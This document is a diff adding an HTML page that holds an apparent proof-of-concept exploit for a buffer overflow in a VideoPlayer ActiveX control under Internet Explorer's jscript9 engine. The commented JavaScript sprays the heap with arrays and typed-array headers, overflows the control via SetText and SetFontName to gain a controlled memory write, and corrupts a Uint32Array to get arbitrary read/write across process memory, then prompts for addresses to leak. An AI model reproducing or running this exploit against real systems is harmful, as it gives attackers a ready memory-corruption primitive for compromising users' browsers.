@@ -1,0 +1,128 @@
+<!DOCTYPE HTML>
+<html>
+<body>
+<button onclick=run()>runme</button>
+<script>
+function run(){
+    /* VideoPlayer.ocx image has the rebase flag set =>
+       It's mapped to another base per process run */
+    /* create its vulnerable ActiveX object (as HTMLObjectElement) */
+    var obj = document.createElement("object");
+    obj.setAttribute("classid", "clsid:4B3476C6-185A-4D19-BB09-718B565FA67B");
+
+    /* amount of arrays to create on the heap */
+    nrArrays = 0x1000
+
+    /* size of data in one array block: 0xefe0 bytes =>
+       subract array header (0x20) and space for typed array headers (0x1000)
+       from 0x10000 */
+    arrSize =  (0x10000-0x20-0x1000)/4
+
+    /* heap array container will hold our heap sprayed data */
+    arr = new Array(nrArrays)
+
+    /* use one buffer for all typed arrays */
+    intArrBuf = new ArrayBuffer(4)
+    
+    /* spray the heap with array data blocks and subsequent typed array headers
+       of type Uint32Array */
+    k = 0
+    while(k < nrArrays){
+        /* create "jscript9!Js::JavascriptArray" with blocksize 0xf000 (data
+           aligned at 0xXXXX0020) */
+        arr[k] = new Array(arrSize);
+        /* fill remaining page (0x1000) after array data with headers of
+           "jscript9!Js::TypedArray<unsigned int>"  (0x55 * 0x30 = 0xff0) as a
+           typed array header has the size of 0x30. 0x10 bytes are left empty */
+        for(var i= 0; i<0x55; i++){
+            /* headers become aligned @ 0xXXXXf000, 0xXXXXf030, 0xXXXXf060,.. */
+            arr[k][i] = new Uint32Array(intArrBuf, 0, 1);
+        }
+        /* tag the array's last element */
+        arr[k][arrSize - 1] = 0x12121212
+        k += 1;
+    }
+
+    /* perform controlled memwrite to 0x1111f010: typed array header is at
+       0x1111f000 to 0x1111f030 => overwrite array data header @ 11111f010 with
+       0x00000001 0x00000004 0x00000040 0x1111f030 0x00
+       The first 3 dwords are sideeffects due to the code we abuse for the
+       controlled memcpy */
+    addr = 0x1111f010  // WHERE TO WRITE
+    /* prepare buffer with address we want to write to */
+    ptrBuf = ""
+    /* fill buffer: length = relative pointer address - buffer start + pointer
+       offset */
+    while (ptrBuf.length < (0x92068 - 0x916a8 + 0xC)){ptrBuf += "A"}
+    ptrBuf += dword2str(addr)
+
+    /* trigger: overflow buffer and overwrite the pointer value after buffer */
+    obj.SetText(ptrBuf,0,0)
+    //alert("buffer overflown => check PTR @ videop_1+92068: dc videop_1+92068")
+
+    /* use overwritten pointer after buffer with method "SetFontName" to conduct
+       memory write.  We overwrite a typed array's header length to 0x40 and let
+       its buffer point to the next typed array header at 0x1111f030 (see above)
+       */
+    obj.SetFontName(dword2str(addr+0x20)) // WHAT TO WRITE
+
+    /* find the corrupted Uint32Array (typed array) */
+    k = 0
+    arrCorrupt = 0
+    while(k < 0x1000-1){
+        for(var i = 0; i < 0x55-1; i++){
+            if(arr[k][i][0] != 0){
+                // address of jscript9!Js::TypedArray<unsigned int>::`vftable'
+                //alert("0x" + arr[k][i][0].toString(16))
+                arrCorrupt = 1
+                break
+            }
+        }
+        if (arrCorrupt == 1) break
+        k++
+    }
+
+    if (!arrCorrupt){
+        alert("cannot find corrupted Uint32Array")
+        return -1
+    }
+
+    /* modify subsequent Uint32Array to be able to RW all process memory */
+    arr[k][i][6] = 0x7fffffff // next Uint32Array length
+    arr[k][i][7] = 0 // set buffer of next Uint32Array to start of process mem
+
+    /* our memory READWRITE interface :) */
+    mem = arr[k][i+1]
+    //alert(mem.length.toString(16))
+    if (mem.length != 0x7fffffff){
+        alert("Cannot change Uint32Array length")
+        return -2
+    }
+
+    //arr[k+1][0] = obj /* ptr to obj @ 0x11120020 */
+
+    /* enter address and leak DWORD */
+    leakAt = 0x1111f000.toString(16)
+    while (1){
+        leakAt = prompt("Enter address to leak", "0x" + leakAt)
+        if (leakAt == null){break}
+        leakAt = parseInt(leakAt, 16)
+        leak = mem[leakAt/4].toString(16)
+        alert("0x" + leakAt.toString(16) + ": 0x" + leak.toString(16))
+        leakAt = leak // next default address to prompt
+    }
+}
+
+/* dword to little endian string */
+function dword2str(dword){
+    str = ""
+    for (n=0; n<4; n++){
+        str += String.fromCharCode((dword >> 8*n) & 0xff)
+    }
+    return str
+
+}
+
+</script>
+</body>
+</html>
